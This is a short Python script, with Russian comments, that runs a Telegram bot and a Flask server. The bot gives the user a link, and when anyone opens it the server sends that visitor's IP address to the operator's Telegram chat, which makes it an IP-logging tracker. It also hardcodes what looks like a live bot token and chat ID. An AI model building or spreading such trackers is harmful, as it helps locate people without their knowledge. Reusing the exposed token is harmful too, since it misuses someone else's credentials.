import asyncio
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from flask import Flask, request
import threading

# ===========================
# ВСТАВЬ СВОЙ ТОКЕН И CHAT_ID
# ===========================
BOT_TOKEN = "8594958713:AAGimwjZ4AYx00iYthAdpgLV_TIcCH1KOk8"
YOUR_CHAT_ID = "1195727659"
PUBLIC_URL = "https://your-render-url.onrender.com"
# ===========================

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

@dp.message(Command("start"))
async def start_cmd(message: types.Message):
    link = f"{PUBLIC_URL}/ip"
    await message.answer(
        f"Вот ссылка для определения IP:\n{link}\n\n"
        f"Когда кто-то перейдёт — я пришлю тебе его IP."
    )

app = Flask(__name__)

@app.route("/ip")
def catch_ip():
    user_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    text = f"Кто-то перешёл по ссылке!\nIP: {user_ip}"
    asyncio.run(bot.send_message(YOUR_CHAT_ID, text))
    return f"Ваш IP: {user_ip}"

def run_flask():
    app.run(host="0.0.0.0", port=10000)

async def run_bot():
    await dp.start_polling(bot)

if __name__ == "__main__":
    threading.Thread(target=run_flask).start()
    asyncio.run(run_bot())
